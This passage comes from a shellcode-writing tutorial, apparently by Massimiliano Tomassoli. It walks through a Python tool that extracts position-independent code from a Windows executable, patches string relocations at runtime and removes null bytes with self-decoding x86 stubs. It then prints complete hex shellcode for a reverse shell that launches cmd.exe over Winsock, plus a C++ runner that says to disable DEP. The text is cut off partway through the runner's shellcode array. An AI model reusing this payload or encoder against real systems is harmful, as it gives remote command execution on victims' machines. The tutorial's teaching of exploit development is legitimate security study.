+0024117E 89 B4 24 B8 00 00 00 mov         dword ptr [esp+0B8h],esi  
+00241185 FF 54 24 34          call        dword ptr [esp+34h]</pre><p>As we can see, the absolute address for<span style="color: #00ff00;"> cmd.exe</span> is 242118h. Note that the address is part of a push instruction and is located at 24116Bh. If we examine the file cmd.exe with a file editor, we see the following:</p><pre class="ignore:true">56A: 68 18 21 40 00           push        000402118h</pre><p>where 56Ah is the offset in the file. The corresponding virtual address (i.e. in memory) is 40116A because the image base is 400000h. This is the preferred address at which the executable should be loaded in memory. The absolute address in the instruction, 402118h, is correct if the executable is loaded at the preferred base address. However, if the executable is loaded at a different base address, the instruction needs to be fixed. How can the Windows loader know what locations of the executable contains addresses which need to be fixed? The PE file contains a <span style="color: #00ccff;">Relocation Directory</span>, which in our case points to the <span style="color: #00ff00;">.reloc</span> section. This contains all the RVAs of the locations that need to be fixed.</p><p>We can inspect this directory and look for addresses of locations that</p><ol><li>are contained in the shellcode (i.e. go from .text:0 to the main function excluded),</li><li>contains pointers to data in<span style="color: #00ff00;"> .rdata</span>.</li></ol><p>For example, the Relocation Directory will contain, among many other addresses, the address 40116Bh which locates the last four bytes of the instruction <span style="color: #00ff00;">push 402118h</span>. These bytes form the address 402118h which points to the string <span style="color: #00ff00;">cmd.exe</span> contained in <span style="color: #00ff00;">.rdata</span> (which starts at address 402000h).</p><p>Let’s look at the function <span style="color: #00ff00;">get_shellcode_and_relocs</span>. In the first part we extract the <span style="color: #00ff00;">.rdata</span> section:</p>
+
+<pre><code class="language-python">def get_shellcode_and_relocs(exe_file, shellcode_len):
+    '''
+    Extracts the shellcode from the .text section of the file exe_file and the string
+    relocations.
+    Returns the triple (shellcode, relocs, addr_to_strings).
+    '''
+    try:
+        # Extracts the shellcode.
+        pe = pefile.PE(exe_file)
+        shellcode = None
+        rdata = None
+        for s in pe.sections:
+            if s.Name == '.text\0\0\0':
+                &lt;snip&gt;
+            elif s.Name == '.rdata\0\0':
+                rdata_start = s.VirtualAddress
+                rdata_end = rdata_start + s.Misc_VirtualSize
+                rdata = pe.get_data(rdata_start, s.Misc_VirtualSize)
+
+        if shellcode is None:
+            raise Exception('.text section not found')
+        if rdata is None:
+            raise Exception('.rdata section not found')
+</code></pre>
+            
+            <p>The relevant part is the body of the <span style="color: #00ff00;">elif</span>.</p><p>In the second part of the same function, we analyze the relocations, find the locations within our shellcode and extract from <span style="color: #00ff00;">.rdata</span> the null-terminated strings referenced by those locations.</p><p>As we already said, we’re only interested in locations contained in our shellcode. Here’s the relevant part of the function <span style="color: #00ff00;">get_shellcode_and_relocs</span>:</p>
+            
+<pre><code class="language-python">        # Extracts the relocations for the shellcode and the referenced strings in .rdata.
+        relocs = []
+        addr_to_strings = {}
+        for rel_data in pe.DIRECTORY_ENTRY_BASERELOC:
+            for entry in rel_data.entries[:-1]:         # the last element's rvs is the base_rva (why?)
+                if shellcode_start &lt;= entry.rva &lt; shellcode_end:
+                    # The relocation location is inside the shellcode.
+                    relocs.append(entry.rva - shellcode_start)      # offset relative to the start of shellcode
+                    string_va = pe.get_dword_at_rva(entry.rva)
+                    string_rva = string_va - pe.OPTIONAL_HEADER.ImageBase
+                    if string_rva &lt; rdata_start or string_rva &gt;= rdata_end:
+                        raise Exception('shellcode references a section other than .rdata')
+                    str = get_cstring(rdata, string_rva - rdata_start)
+                    if str is None:
+                        raise Exception('Cannot extract string from .rdata')
+                    addr_to_strings[string_va] = str
+
+        return (shellcode, relocs, addr_to_strings)
+</code></pre>
+        
+        <p><span style="color: #00ff00;">pe.DIRECTORY_ENTRY_BASERELOC</span> is a list of data structures which contain a field named <span style="color: #00ff00;">entries</span> which is a list of relocations. First we check that the current relocation is within the shellcode. If it is, we do the following:</p><ol><li>we append to <span style="color: #00ff00;">relocs</span> the offset of the relocation relative to the start of the shellcode;</li><li>we extract from the shellcode the DWORD located at the offset just found and check that this DWORD points to data in<span style="color: #00ff00;"> .rdata</span>;</li><li>we extract from <span style="color: #00ff00;">.rdata</span> the null-terminated string whose starting location we found in (2);</li><li>we add the string to <span style="color: #00ff00;">addr_to_strings</span>.</li></ol><p>Note that:</p><ol style="list-style-type: lower-roman;"><li><span style="color: #00ff00;">relocs</span> contains the offsets of the relocations within shellcode, i.e. the offsets of the DWORDs within shellcode that need to be fixed so that they point to the strings;</li><li><span style="color: #00ff00;">addr_to_strings</span> is a dictionary that associates the addresses found in (2) above to the actual strings.</li></ol><h3>adding the loader to the shellcode</h3><p>The idea is to add the strings contained in <span style="color: #00ff00;">addr_to_strings</span> to the end of our shellcode and then to make the code in our shellcode reference those strings. Unfortunately, the <span style="color: #00ff00;">code</span>→<span style="color: #00ff00;">strings</span> linking must be done at runtime because we don’t know the starting address of the shellcode. To do this, we need to prepend a sort of “loader” which fixes the shellcode at runtime. Here’s the structure of our shellcode after the transformation:<br> 
+<a href="images/pic_a1.png"><img src="images/pic_a1.png" alt="pic_a1" width="377" height="393"></a>
+        </p><p><span style="color: #00ff00;">offX</span> are DWORDs which point to the locations in the original shellcode that need to be fixed. The loader will fix these locations so that they point to the correct strings <span style="color: #00ff00;">strX</span>.</p><p>To see exactly how things work, try to understand the following code:</p>
+        
+<pre><code class="language-python">def add_loader_to_shellcode(shellcode, relocs, addr_to_strings):
+    if len(relocs) == 0:
+        return shellcode                # there are no relocations
+
+    # The format of the new shellcode is:
+    #       call    here
+    #   here:
+    #       ...
+    #   shellcode_start:
+    #       &lt;shellcode&gt;         (contains offsets to strX (offset are from "here" label))
+    #   relocs:
+    #       off1|off2|...       (offsets to relocations (offset are from "here" label))
+    #       str1|str2|...
+
+    delta = 21                                      # shellcode_start - here
+
+    # Builds the first part (up to and not including the shellcode).
+    x = dword_to_bytes(delta + len(shellcode))
+    y = dword_to_bytes(len(relocs))
+    code = [
+        0xE8, 0x00, 0x00, 0x00, 0x00,               #   CALL here
+                                                    # here:
+        0x5E,                                       #   POP ESI
+        0x8B, 0xFE,                                 #   MOV EDI, ESI
+        0x81, 0xC6, x[0], x[1], x[2], x[3],         #   ADD ESI, shellcode_start + len(shellcode) - here
+        0xB9, y[0], y[1], y[2], y[3],               #   MOV ECX, len(relocs)
+        0xFC,                                       #   CLD
+                                                    # again:
+        0xAD,                                       #   LODSD
+        0x01, 0x3C, 0x07,                           #   ADD [EDI+EAX], EDI
+        0xE2, 0xFA                                  #   LOOP again
+                                                    # shellcode_start:
+    ]
+
+    # Builds the final part (offX and strX).
+    offset = delta + len(shellcode) + len(relocs) * 4           # offset from "here" label
+    final_part = [dword_to_string(r + delta) for r in relocs]
+    addr_to_offset = {}
+    for addr in addr_to_strings.keys():
+        str = addr_to_strings[addr]
+        final_part.append(str)
+        addr_to_offset[addr] = offset
+        offset += len(str)
+
+    # Fixes the shellcode so that the pointers referenced by relocs point to the
+    # string in the final part.
+    byte_shellcode = [ord(c) for c in shellcode]
+    for off in relocs:
+        addr = bytes_to_dword(byte_shellcode[off:off+4])
+        byte_shellcode[off:off+4] = dword_to_bytes(addr_to_offset[addr])
+
+    return ''.join([chr(b) for b in (code + byte_shellcode)]) + ''.join(final_part)
+</code></pre>
+    
+    <p>Let’s have a look at the loader:</p>
+    
+<pre><code class="language-x86asm">    CALL here                   ; PUSH EIP+5; JMP here
+  here:
+    POP ESI                     ; ESI = address of "here"
+    MOV EDI, ESI                ; EDI = address of "here"
+    ADD ESI, shellcode_start + len(shellcode) - here        ; ESI = address of off1
+    MOV ECX, len(relocs)        ; ECX = number of locations to fix
+    CLD                         ; tells LODSD to go forwards
+  again:
+    LODSD                       ; EAX = offX; ESI += 4
+    ADD [EDI+EAX], EDI          ; fixes location within shellcode
+    LOOP again                  ; DEC ECX; if ECX &gt; 0 then JMP again
+  shellcode_start:
+    &lt;shellcode&gt;
+  relocs:
+    off1|off2|...
+    str1|str2|...
+</code></pre>
+    
+    <p>The first CALL is used to get the absolute address of <span style="color: #00ff00;">here</span> in memory. The loader uses this information to fix the offsets within the original shellcode. ESI points to <span style="color: #00ff00;">off1</span> so <span style="color: #00ff00;">LODSD</span> is used to read the offsets one by one. The instruction</p><pre class="ignore:true">ADD [EDI+EAX], EDI</pre><p>fixes the locations within the shellcode. EAX is the current <span style="color: #00ff00;">offX</span> which is the offset of the location relative to <span style="color: #00ff00;">here</span>. This means that EDI+EAX is the absolute address of that location. The DWORD at that location contains the offset to the correct string relative to <span style="color: #00ff00;">here</span>. By adding EDI to that DWORD, we turn the DWORD into the absolute address to the string. When the loader has finished, the shellcode, now fixed, is executed.</p><p>To conclude, it should be said that <span style="color: #00ff00;">add_loader_to_shellcode</span> is called only if there are relocations. You can see that in the main function:</p>
+    
+<pre><code class="language-python">&lt;snip&gt;
+    if len(relocs) != 0:
+        print('Found %d reference(s) to %d string(s) in .rdata' % (len(relocs), len(addr_to_strings)))
+        print('Strings:')
+        for s in addr_to_strings.values():
+            print('  ' + s[:-1])
+        print('')
+        shellcode = add_loader_to_shellcode(shellcode, relocs, addr_to_strings)
+    else:
+        print('No relocations found')
+&lt;snip&gt;
+</code></pre>
+
+<p></p><h3>Removing null-bytes from the shellcode (I)</h3><p>After relocations, if any, have been handled, it’s time to deal with the null bytes present in the shellcode. As we’ve already said, we need to remove them. To do that, I wrote two functions:</p><ol><li><span style="color: #00ff00;">get_fixed_shellcode_single_block</span></li><li><span style="color: #00ff00;">get_fixed_shellcode</span></li></ol><p>The first function doesn’t always work but produces shorter code so it should be tried first. The second function produces longer code but is guaranteed to work.</p><p>Let’s start with <span style="color: #00ff00;">get_fixed_shellcode_single_block</span>. Here’s the function definition:</p>
+
+<pre><code class="language-python">def get_fixed_shellcode_single_block(shellcode):
+    '''
+    Returns a version of shellcode without null bytes or None if the
+    shellcode can't be fixed.
+    If this function fails, use get_fixed_shellcode().
+    '''
+
+    # Finds one non-null byte not present, if any.
+    bytes = set([ord(c) for c in shellcode])
+    missing_bytes = [b for b in range(1, 256) if b not in bytes]
+    if len(missing_bytes) == 0:
+        return None                             # shellcode can't be fixed
+    missing_byte = missing_bytes[0]
+
+    (xor1, xor2) = get_xor_values(len(shellcode))
+
+    code = [
+        0xE8, 0xFF, 0xFF, 0xFF, 0xFF,                       #   CALL $ + 4
+                                                            # here:
+        0xC0,                                               #   (FF)C0 = INC EAX
+        0x5F,                                               #   POP EDI
+        0xB9, xor1[0], xor1[1], xor1[2], xor1[3],           #   MOV ECX, &lt;xor value 1 for shellcode len&gt;
+        0x81, 0xF1, xor2[0], xor2[1], xor2[2], xor2[3],     #   XOR ECX, &lt;xor value 2 for shellcode len&gt;
+        0x83, 0xC7, 29,                                     #   ADD EDI, shellcode_begin - here
+        0x33, 0xF6,                                         #   XOR ESI, ESI
+        0xFC,                                               #   CLD
+                                                            # loop1:
+        0x8A, 0x07,                                         #   MOV AL, BYTE PTR [EDI]
+        0x3C, missing_byte,                                 #   CMP AL, &lt;missing byte&gt;
+        0x0F, 0x44, 0xC6,                                   #   CMOVE EAX, ESI
+        0xAA,                                               #   STOSB
+        0xE2, 0xF6                                          #   LOOP loop1
+                                                            # shellcode_begin:
+    ]
+
+    return ''.join([chr(x) for x in code]) + shellcode.replace('\0', chr(missing_byte))
+</code></pre>
+    
+    <p>The idea is very simple. We analyze the shellcode byte by byte and see if there is a missing value, i.e. a byte value which doesn’t appear anywhere in the shellcode. Let’s say this value is 0x14. We can now replace every 0x00 in the shellcode with 0x14. The shellcode doesn’t contain null bytes anymore but can’t run because was modified. The last step is to add some sort of decoder to the shellcode that, at runtime, will restore the null bytes before the original shellcode is executed. You can see that code defined in the array <span style="color: #00ff00;">code</span>:</p>
+    
+<pre><code class="language-x86asm">  CALL $ + 4                                  ; PUSH "here"; JMP "here"-1
+here:
+  (FF)C0 = INC EAX                            ; not important: just a NOP
+  POP EDI                                     ; EDI = "here"
+  MOV ECX, &lt;xor value 1 for shellcode len&gt;
+  XOR ECX, &lt;xor value 2 for shellcode len&gt;    ; ECX = shellcode length
+  ADD EDI, shellcode_begin - here             ; EDI = absolute address of original shellcode
+  XOR ESI, ESI                                ; ESI = 0
+  CLD                                         ; tells STOSB to go forwards
+loop1:
+  MOV AL, BYTE PTR [EDI]                      ; AL = current byte of the shellcode
+  CMP AL, &lt;missing byte&gt;                      ; is AL the special byte?
+  CMOVE EAX, ESI                              ; if AL is the special byte, then EAX = 0
+  STOSB                                       ; overwrite the current byte of the shellcode with AL
+  LOOP loop1                                  ; DEC ECX; if ECX &gt; 0 then JMP loop1
+shellcode_begin:
+</code></pre>
+
+<p>There are a couple of important details to discuss. First of all, this code can’t contain null bytes itself, because then we’d need another piece of code to remove them 🙂</p><p>As you can see, the <span style="color: #00ff00;">CALL</span> instruction doesn’t jump to <span style="color: #00ff00;">here</span> because otherwise its opcode would’ve been</p><pre class="ignore:true">E8 00 00 00 00               #   CALL here</pre><p>which contains four null bytes. Since the <span style="color: #00ff00;">CALL</span> instruction is 5 bytes, <span style="color: #00ff00;">CALL here</span> is equivalent to <span style="color: #00ff00;">CALL $+5</span>. The trick to get rid of the null bytes is to use <span style="color: #00ff00;">CALL $+4</span>:</p><pre class="ignore:true">E8 FF FF FF FF               #   CALL $+4</pre><p>That <span style="color: #00ff00;">CALL</span> skips 4 bytes and jmp to the last <span style="color: #00ff00;">FF</span> of the <span style="color: #00ff00;">CALL</span> itself. The <span style="color: #00ff00;">CALL</span> instruction is followed by the byte C0, so the instruction executed after the <span style="color: #00ff00;">CALL</span> is <span style="color: #00ff00;">INC EAX</span> which corresponds to <span style="color: #00ff00;">FF C0</span>. Note that the value pushed by the <span style="color: #00ff00;">CALL</span> is still the absolute address of the <span style="color: #00ff00;">here</span> label.</p><p>There’s a second trick in the code to avoid null bytes:</p>
+
+<pre><code class="language-x86asm">MOV ECX, &lt;xor value 1 for shellcode len&gt;
+XOR ECX, &lt;xor value 2 for shellcode len&gt;
+</code></pre>
+
+<p>We could have just used</p>
+
+<pre><code class="language-x86asm">MOV ECX, &lt;shellcode len&gt;
+</code></pre>
+
+<p>but that would’ve produced null bytes. In fact, for a shellcode of length 0x400, we would’ve had</p><pre class="ignore:true">B9 00 04 00 00        MOV ECX, 400h</pre><p>which contains 3 null bytes.</p><p>To avoid that, we choose a non-null byte which doesn’t appear in 00000400h. Let’s say we choose 0x01. Now we compute</p><p style="padding-left: 30px;"><span style="color: #00ff00;">&lt;xor value 1 for shellcode len&gt;</span> = 00000400h xor 01010101 = 01010501h<br> <span style="color: #00ff00;">&lt;xor value 2 for shellcode len&gt;</span> = 01010101h</p><p>The net result is that <span style="color: #00ff00;">&lt;xor value 1 for shellcode len&gt;</span> and <span style="color: #00ff00;">&lt;xor value 2 for shellcode len&gt;</span> are both null-byte free and, when xored, produce the original value 400h.</p><p>Our two instructions become:</p><pre class="ignore:true">B9 01 05 01 01        MOV ECX, 01010501h
+81 F1 01 01 01 01     XOR ECX, 01010101h</pre><p>The two <span style="color: #00ff00;">xor values</span> are computed by the function <span style="color: #00ff00;">get_xor_values</span>.</p><p>Having said that, the code is easy to understand: it just walks through the shellcode byte by byte and overwrites with null bytes the bytes which contain the special value (0x14, in our previous example).</p><h3>Removing null-bytes from the shellcode (II)</h3><p>The method above can fail because we could be unable to find a byte value which isn’t already present in the shellcode. If that happens, we need to use <span style="color: #00ff00;">get_fixed_shellcode</span>, which is a little more complex.</p><p>The idea is to divide the shellcode into blocks of 254 bytes. Note that each block must have a “missing byte” because a byte can have 255 non-zero values. We could choose a missing byte for each block and handle each block individually. But that wouldn’t be very space efficient, because for a shellcode of 254*N bytes we would need to store N “missing bytes” before or after the shellcode (the decoder needs to know the missing bytes). A more clever approach is to use the same “missing byte” for as many 254-byte blocks as possible. We start from the beginning of the shellcode and keep taking blocks until we run out of missing bytes. When this happens, we remove the last block from the previous chunk and begin with a new chunk starting from this last block. In the end, we will have a list of <span style="color: #00ff00;">&lt;missing_byte, num_blocks&gt;</span> pairs:</p><pre class="ignore:true">[(missing_byte1, num_blocks1), (missing_byte2, num_blocks2), ...]</pre><p>I decided to restrict <span style="color: #00ff00;">num_blocksX</span> to a single byte, so <span style="color: #00ff00;">num_blocksX</span> is between 1 and 255.</p><p>Here’s the part of <span style="color: #00ff00;">get_fixed_shellcode</span> which splits the shellcode into chunks:</p>
+
+<pre><code class="language-python">def get_fixed_shellcode(shellcode):
+    '''
+    Returns a version of shellcode without null bytes. This version divides
+    the shellcode into multiple blocks and should be used only if
+    get_fixed_shellcode_single_block() doesn't work with this shellcode.
+    '''
+
+    # The format of bytes_blocks is
+    #   [missing_byte1, number_of_blocks1,
+    #    missing_byte2, number_of_blocks2, ...]
+    # where missing_byteX is the value used to overwrite the null bytes in the
+    # shellcode, while number_of_blocksX is the number of 254-byte blocks where
+    # to use the corresponding missing_byteX.
+    bytes_blocks = []
+    shellcode_len = len(shellcode)
+    i = 0
+    while i &lt; shellcode_len:
+        num_blocks = 0
+        missing_bytes = list(range(1, 256))
+
+        # Tries to find as many 254-byte contiguous blocks as possible which misses at
+        # least one non-null value. Note that a single 254-byte block always misses at
+        # least one non-null value.
+        while True:
+            if i &gt;= shellcode_len or num_blocks == 255:
+                bytes_blocks += [missing_bytes[0], num_blocks]
+                break
+            bytes = set([ord(c) for c in shellcode[i:i+254]])
+            new_missing_bytes = [b for b in missing_bytes if b not in bytes]
+            if len(new_missing_bytes) != 0:         # new block added
+                missing_bytes = new_missing_bytes
+                num_blocks += 1
+                i += 254
+            else:
+                bytes += [missing_bytes[0], num_blocks]
+                break
+&lt;snip&gt;
+</code></pre>
+
+<p>Like before, we need to discuss the “<span style="color: #00ccff;">decoder</span>” which is prepended to the shellcode. This decoder is a bit longer than the previous one but the principle is the same.</p><p>Here’s the code:</p>
+
+<pre><code class="language-python">code = ([
+    0xEB, len(bytes_blocks)] +                          #   JMP SHORT skip_bytes
+                                                        # bytes:
+    bytes_blocks + [                                    #   ...
+                                                        # skip_bytes:
+    0xE8, 0xFF, 0xFF, 0xFF, 0xFF,                       #   CALL $ + 4
+                                                        # here:
+    0xC0,                                               #   (FF)C0 = INC EAX
+    0x5F,                                               #   POP EDI
+    0xB9, xor1[0], xor1[1], xor1[2], xor1[3],           #   MOV ECX, &lt;xor value 1 for shellcode len&gt;
+    0x81, 0xF1, xor2[0], xor2[1], xor2[2], xor2[3],     #   XOR ECX, &lt;xor value 2 for shellcode len&gt;
+    0x8D, 0x5F, -(len(bytes_blocks) + 5) &amp; 0xFF,        #   LEA EBX, [EDI + (bytes - here)]
+    0x83, 0xC7, 0x30,                                   #   ADD EDI, shellcode_begin - here
+                                                        # loop1:
+    0xB0, 0xFE,                                         #   MOV AL, 0FEh
+    0xF6, 0x63, 0x01,                                   #   MUL AL, BYTE PTR [EBX+1]
+    0x0F, 0xB7, 0xD0,                                   #   MOVZX EDX, AX
+    0x33, 0xF6,                                         #   XOR ESI, ESI
+    0xFC,                                               #   CLD
+                                                        # loop2:
+    0x8A, 0x07,                                         #   MOV AL, BYTE PTR [EDI]
+    0x3A, 0x03,                                         #   CMP AL, BYTE PTR [EBX]
+    0x0F, 0x44, 0xC6,                                   #   CMOVE EAX, ESI
+    0xAA,                                               #   STOSB
+    0x49,                                               #   DEC ECX
+    0x74, 0x07,                                         #   JE shellcode_begin
+    0x4A,                                               #   DEC EDX
+    0x75, 0xF2,                                         #   JNE loop2
+    0x43,                                               #   INC EBX
+    0x43,                                               #   INC EBX
+    0xEB, 0xE3                                          #   JMP loop1
+                                                        # shellcode_begin:
+])
+</code></pre>
+
+<p><span style="color: #00ff00;">bytes_blocks</span> is the array</p><pre class="ignore:true">[missing_byte1, num_blocks1, missing_byte2, num_blocks2, ...]</pre><p>we talked about before, but without pairs.</p><p>Note that the code starts with a <span style="color: #00ff00;">JMP SHORT</span> which skips <span style="color: #00ff00;">bytes_blocks</span>. For this to work <span style="color: #00ff00;">len(bytes_blocks)</span> must be less than or equal to 0x7F. But as you can see, <span style="color: #00ff00;">len(bytes_blocks)</span> appears in another instruction as well:</p>
+
+<pre><code class="language-python">0x8D, 0x5F, -(len(bytes_blocks) + 5) &amp; 0xFF,        #   LEA EBX, [EDI + (bytes - here)]
+</code></pre>
+
+<p>This requires that <span style="color: #00ff00;">len(bytes_blocks)</span> is less than or equal to <span style="color: #00ff00;">0x7F – 5</span>, so this is the final condition. This is what happens if the condition is violated:</p>
+
+<pre><code class="language-python">    if len(bytes_blocks) &gt; 0x7f - 5:
+        # Can't assemble "LEA EBX, [EDI + (bytes-here)]" or "JMP skip_bytes".
+        return None
+</code></pre>
+        
+        <p>Let’s review the code in more detail:</p>
+        
+<pre><code class="language-x86asm">  JMP SHORT skip_bytes
+bytes:
+  ...
+skip_bytes:
+  CALL $ + 4                                  ; PUSH "here"; JMP "here"-1
+here:
+  (FF)C0 = INC EAX                            ; not important: just a NOP
+  POP EDI                                     ; EDI = absolute address of "here"
+  MOV ECX, &lt;xor value 1 for shellcode len&gt;
+  XOR ECX, &lt;xor value 2 for shellcode len&gt;    ; ECX = shellcode length
+  LEA EBX, [EDI + (bytes - here)]             ; EBX = absolute address of "bytes"
+  ADD EDI, shellcode_begin - here             ; EDI = absolute address of the shellcode
+loop1:
+  MOV AL, 0FEh                                ; AL = 254
+  MUL AL, BYTE PTR [EBX+1]                    ; AX = 254 * current num_blocksX = num bytes
+  MOVZX EDX, AX                               ; EDX = num bytes of the current chunk
+  XOR ESI, ESI                                ; ESI = 0
+  CLD                                         ; tells STOSB to go forwards
+loop2:
+  MOV AL, BYTE PTR [EDI]                      ; AL = current byte of shellcode
+  CMP AL, BYTE PTR [EBX]                      ; is AL the missing byte for the current chunk?
+  CMOVE EAX, ESI                              ; if it is, then EAX = 0
+  STOSB                                       ; replaces the current byte of the shellcode with AL
+  DEC ECX                                     ; ECX -= 1
+  JE shellcode_begin                          ; if ECX == 0, then we're done!
+  DEC EDX                                     ; EDX -= 1
+  JNE loop2                                   ; if EDX != 0, then we keep working on the current chunk
+  INC EBX                                     ; EBX += 1  (moves to next pair...
+  INC EBX                                     ; EBX += 1   ... missing_bytes, num_blocks)
+  JMP loop1                                   ; starts working on the next chunk
+shellcode_begin:
+</code></pre>
+
+<p></p><h2>Testing the script</h2><p>This is the easy part! If we run the script without any arguments it says:</p><pre class="ignore:true">Shellcode Extractor by Massimiliano Tomassoli (2015)
+ 
+Usage:
+  sce.py &lt;exe file&gt; &lt;map file&gt;</pre><p>If you remember, we told the linker of VS 2013 to also produce a map file. Just call the script with the path to the exe file and the path to the map file. Here’s what we get for our reverse shell:</p><pre class="ignore:true">Shellcode Extractor by Massimiliano Tomassoli (2015)
+
+Extracting shellcode length from "mapfile"...
+shellcode length: 614
+Extracting shellcode from "shellcode.exe" and analyzing relocations...
+Found 3 reference(s) to 3 string(s) in .rdata
+Strings:
+  ws2_32.dll
+  cmd.exe
+  127.0.0.1
+
+Fixing the shellcode...
+final shellcode length: 715
+
+char shellcode[] =
+"\xe8\xff\xff\xff\xff\xc0\x5f\xb9\xa8\x03\x01\x01\x81\xf1\x01\x01"
+"\x01\x01\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x05\x0f\x44\xc6\xaa"
+"\xe2\xf6\xe8\x05\x05\x05\x05\x5e\x8b\xfe\x81\xc6\x7b\x02\x05\x05"
+"\xb9\x03\x05\x05\x05\xfc\xad\x01\x3c\x07\xe2\xfa\x55\x8b\xec\x83"
+"\xe4\xf8\x81\xec\x24\x02\x05\x05\x53\x56\x57\xb9\x8d\x10\xb7\xf8"
+"\xe8\xa5\x01\x05\x05\x68\x87\x02\x05\x05\xff\xd0\xb9\x40\xd5\xdc"
+"\x2d\xe8\x94\x01\x05\x05\xb9\x6f\xf1\xd4\x9f\x8b\xf0\xe8\x88\x01"
+"\x05\x05\xb9\x82\xa1\x0d\xa5\x8b\xf8\xe8\x7c\x01\x05\x05\xb9\x70"
+"\xbe\x1c\x23\x89\x44\x24\x18\xe8\x6e\x01\x05\x05\xb9\xd1\xfe\x73"
+"\x1b\x89\x44\x24\x0c\xe8\x60\x01\x05\x05\xb9\xe2\xfa\x1b\x01\xe8"
+"\x56\x01\x05\x05\xb9\xc9\x53\x29\xdc\x89\x44\x24\x20\xe8\x48\x01"
+"\x05\x05\xb9\x6e\x85\x1c\x5c\x89\x44\x24\x1c\xe8\x3a\x01\x05\x05"
+"\xb9\xe0\x53\x31\x4b\x89\x44\x24\x24\xe8\x2c\x01\x05\x05\xb9\x98"
+"\x94\x8e\xca\x8b\xd8\xe8\x20\x01\x05\x05\x89\x44\x24\x10\x8d\x84"
+"\x24\xa0\x05\x05\x05\x50\x68\x02\x02\x05\x05\xff\xd6\x33\xc9\x85"
+"\xc0\x0f\x85\xd8\x05\x05\x05\x51\x51\x51\x6a\x06\x6a\x01\x6a\x02"
+"\x58\x50\xff\xd7\x8b\xf0\x33\xff\x83\xfe\xff\x0f\x84\xc0\x05\x05"
+"\x05\x8d\x44\x24\x14\x50\x57\x57\x68\x9a\x02\x05\x05\xff\x54\x24"
+"\x2c\x85\xc0\x0f\x85\xa8\x05\x05\x05\x6a\x02\x57\x57\x6a\x10\x8d"
+"\x44\x24\x58\x50\x8b\x44\x24\x28\xff\x70\x10\xff\x70\x18\xff\x54"
+"\x24\x40\x6a\x02\x58\x66\x89\x44\x24\x28\xb8\x05\x7b\x05\x05\x66"
+"\x89\x44\x24\x2a\x8d\x44\x24\x48\x50\xff\x54\x24\x24\x57\x57\x57"
+"\x57\x89\x44\x24\x3c\x8d\x44\x24\x38\x6a\x10\x50\x56\xff\x54\x24"
+"\x34\x85\xc0\x75\x5c\x6a\x44\x5f\x8b\xcf\x8d\x44\x24\x58\x33\xd2"
+"\x88\x10\x40\x49\x75\xfa\x8d\x44\x24\x38\x89\x7c\x24\x58\x50\x8d"
+"\x44\x24\x5c\xc7\x84\x24\x88\x05\x05\x05\x05\x01\x05\x05\x50\x52"
+"\x52\x52\x6a\x01\x52\x52\x68\x92\x02\x05\x05\x52\x89\xb4\x24\xc0"
+"\x05\x05\x05\x89\xb4\x24\xbc\x05\x05\x05\x89\xb4\x24\xb8\x05\x05"
+"\x05\xff\x54\x24\x34\x6a\xff\xff\x74\x24\x3c\xff\x54\x24\x18\x33"
+"\xff\x57\xff\xd3\x5f\x5e\x33\xc0\x5b\x8b\xe5\x5d\xc3\x33\xd2\xeb"
+"\x10\xc1\xca\x0d\x3c\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0"
+"\x41\x8a\x01\x84\xc0\x75\xea\x8b\xc2\xc3\x55\x8b\xec\x83\xec\x14"
+"\x53\x56\x57\x89\x4d\xf4\x64\xa1\x30\x05\x05\x05\x89\x45\xfc\x8b"
+"\x45\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8d\x47\xf8"
+"\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46\x3c\x8b\x5c\x30\x78"
+"\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x9e\xff\xff\xff\x8b"
+"\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89\x4d\xf0\x89\x45\xfc"
+"\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x7d\xff\xff\xff"
+"\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc\x8b\x4d\xf0\x40\x89"
+"\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\xa0\x33\xc0\x5f"
+"\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44\x33\x24\x8d\x04\x48"
+"\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04\x30\x03\xc6"
+"\xeb\xdd\x2f\x05\x05\x05\xf2\x05\x05\x05\x80\x01\x05\x05\x77\x73"
+"\x32\x5f\x33\x32\x2e\x64\x6c\x6c\x05\x63\x6d\x64\x2e\x65\x78\x65"
+"\x05\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x05";</pre><p>The part about relocations is very important, because you can check if everything is OK. For example, we know that our reverse shell uses 3 strings and they were all correctly extracted from the .rdata section. We can see that the original shellcode was 614 bytes and the resulting shellcode (after handling relocations and null bytes) is 715 bytes.</p><p>Now we need to run the resulting shellcode in some way. The script gives us the shellcode in C/C++ format, so we just need to copy and paste it into a small C/C++ file. Here’s the complete <a href="code/run_shellcode.cpp">source code</a>:</p>
+
+<pre><code class="language-cpp">#include &lt;cstring&gt;
+#include &lt;cassert&gt;
+
+// Important: Disable DEP!
+//  (Linker-&gt;Advanced-&gt;Data Execution Prevention = NO)
+
+void main() {
+    char shellcode[] =
+        "\xe8\xff\xff\xff\xff\xc0\x5f\xb9\xa8\x03\x01\x01\x81\xf1\x01\x01"
+        "\x01\x01\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x05\x0f\x44\xc6\xaa"
+        "\xe2\xf6\xe8\x05\x05\x05\x05\x5e\x8b\xfe\x81\xc6\x7b\x02\x05\x05"
+        "\xb9\x03\x05\x05\x05\xfc\xad\x01\x3c\x07\xe2\xfa\x55\x8b\xec\x83"
+        "\xe4\xf8\x81\xec\x24\x02\x05\x05\x53\x56\x57\xb9\x8d\x10\xb7\xf8"
+        "\xe8\xa5\x01\x05\x05\x68\x87\x02\x05\x05\xff\xd0\xb9\x40\xd5\xdc"
+        "\x2d\xe8\x94\x01\x05\x05\xb9\x6f\xf1\xd4\x9f\x8b\xf0\xe8\x88\x01"
+        "\x05\x05\xb9\x82\xa1\x0d\xa5\x8b\xf8\xe8\x7c\x01\x05\x05\xb9\x70"
+        "\xbe\x1c\x23\x89\x44\x24\x18\xe8\x6e\x01\x05\x05\xb9\xd1\xfe\x73"
